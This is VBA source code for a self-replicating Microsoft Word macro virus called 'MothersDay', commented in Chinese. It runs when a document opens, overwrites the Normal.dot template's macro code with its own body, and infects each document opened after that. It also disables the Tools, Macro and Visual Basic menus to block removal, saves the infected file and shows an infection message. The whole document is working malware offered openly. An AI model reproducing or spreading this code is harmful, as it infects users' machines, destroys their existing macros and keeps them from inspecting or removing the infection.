Sub Document_Open()
On Error Resume Next

    Dim VirusName As String
    Dim ActiveDocumentVirusStartCode As String
    Dim NormalTemplateVirusStartCode As String
    Dim PassWord As String
    Dim VirusEndCode As String
    Dim ActiveDocumentCodeCountOfLines As Long
    Dim NormalTemplateCodeCountOfLines As Long
    Dim Code As String
    Dim VirusSrcCodeIndex As Integer
    Dim VirusDstCodeIndex As Integer
    Dim IsFind As Boolean
    
    VirusName = "MothersDay"
    ActiveDocumentVirusStartCode = "Sub Document_Open()"
    NormalTemplateVirusStartCode = "Sub AutoClose()"
    VirusEndCode = "End Sub"
    
    Set ActiveDocumentItem1 = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NormalTemplateItem1 = NormalTemplate.VBProject.VBComponents.Item(1)
    
    'NormalTemplateItem1.Name = "ThisDocument"
    'ActiveDocumentItem1.Name = "ThisDocument"
    
    '判断ActiveDocument和Normal.dot是否感染
    If ActiveDocumentItem1.Name = VirusName And NormalTemplateItem1.Name = VirusName Then
        GoTo ATTACK
    End If
    
    '获取ActiveDocument和Normal.dot代码长度
    ActiveDocumentCodeCountOfLines = ActiveDocumentItem1.CodeModule.CountOfLines
    NormalTemplateCodeCountOfLines = NormalTemplateItem1.CodeModule.CountOfLines
    
    '判断若不是Word文档则不感染,在Word 2003(Application.Version = "11.0")中ActiveDocument.Name中不含有"Document"
    'If NormalTemplateCodeCountOfLines > 0 And ActiveDocumentCodeCountOfLines = 0 And (InStr(1,ActiveDocument.Name, "Document")=False) Then
    '   GoTo THEEND
    'End If
    
    '感染Normal.dot
    If NormalTemplateItem1.Name <> VirusName Then
        '清空Normal.dot
        NormalTemplateItem1.CodeModule.DeleteLines 1, NormalTemplateCodeCountOfLines
        
        '获取病毒起始地址(行号保存在Index中)
        VirusSrcCodeIndex = 1
        IsFind = False
        Do
            Code = ActiveDocumentItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
            If Code <> ActiveDocumentVirusStartCode Then
                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
            Else
                IsFind = True
                Exit Do
            End If
        Loop While VirusSrcCodeIndex <= ActiveDocumentCodeCountOfLines
        
        If IsFind = True And VirusSrcCodeIndex < ActiveDocumentCodeCountOfLines Then
        
            VirusDstCodeIndex = 1
            '注入病毒新的头(Sub AutoOpen())
            NormalTemplateItem1.CodeModule.InsertLines VirusDstCodeIndex, NormalTemplateVirusStartCode
            '注入病毒主体
            Do
                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
                VirusDstCodeIndex = VirusDstCodeIndex + 1
                Code = ActiveDocumentItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
                NormalTemplateItem1.CodeModule.InsertLines VirusDstCodeIndex, Code
            Loop While (Code <> VirusEndCode And VirusSrcCodeIndex < ActiveDocumentCodeCountOfLines)
            
            '设置感染标记
            NormalTemplateItem1.Name = VirusName
            
        Else
            GoTo THEEND
        End If
        
    End If
    
    '感染ActiveDocument
    If ActiveDocumentItem1.Name <> VirusName Then
        '清空ActiveDocument
        ActiveDocumentItem1.CodeModule.DeleteLines 1, ActiveDocumentCodeCountOfLines
        
        '获取病毒起始地址(行号保存在Index中)
        VirusSrcCodeIndex = 1
        IsFind = False
        Do
            Code = NormalTemplateItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
            If Code <> NormalTemplateVirusStartCode Then
                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
            Else
                IsFind = True
                Exit Do
            End If
        Loop While VirusSrcCodeIndex <= NormalTemplateCodeCountOfLines
        
        If IsFind = True And VirusSrcCodeIndex < NormalTemplateCodeCountOfLines Then
        
            VirusDstCodeIndex = 1
            '注入病毒新的头(Sub AutoOpen())
            ActiveDocumentItem1.CodeModule.InsertLines VirusDstCodeIndex, ActiveDocumentVirusStartCode
            '注入病毒主体
            Do
                VirusSrcCodeIndex = VirusSrcCodeIndex + 1
                VirusDstCodeIndex = VirusDstCodeIndex + 1
                Code = NormalTemplateItem1.CodeModule.Lines(VirusSrcCodeIndex, 1)
                ActiveDocumentItem1.CodeModule.InsertLines VirusDstCodeIndex, Code
            Loop While (Code <> VirusEndCode And VirusSrcCodeIndex < NormalTemplateCodeCountOfLines)
            
            '设置感染标记
            ActiveDocumentItem1.Name = VirusName
            
        Else
            GoTo THEEND
        End If
        
    End If
    
ATTACK:
    '添加以下代码可以使文档被感染后再次打开时输入密码,若密码输入错误即无法打开文档,此病毒将不会代码将不会被执行
    'ActiveDocument.Password = "0514"
    
    '禁用宏菜单编辑功能
    Application.CommandBars("Tools").Enabled = False
    Application.CommandBars("Macro").Enabled = False
    Index = 1
    Do
        Application.CommandBars("Macro").Controls(Index).Enabled = False
        Index = Index + 1
    Loop While Index <= Application.CommandBars("Macro").Controls.Count
    '禁用“Visual Basic”工具栏,可能还需要禁用“自定义”工具栏
    Application.CommandBars("Visual Basic").Enabled = False
    
    '添加自动保存
    ActiveDocument.Save
    
    '弹出对话框
    MsgBox Prompt:="计算机已感染母亲节病毒", Title:="计算机已感染母亲节病毒"
THEEND:
    
End Sub
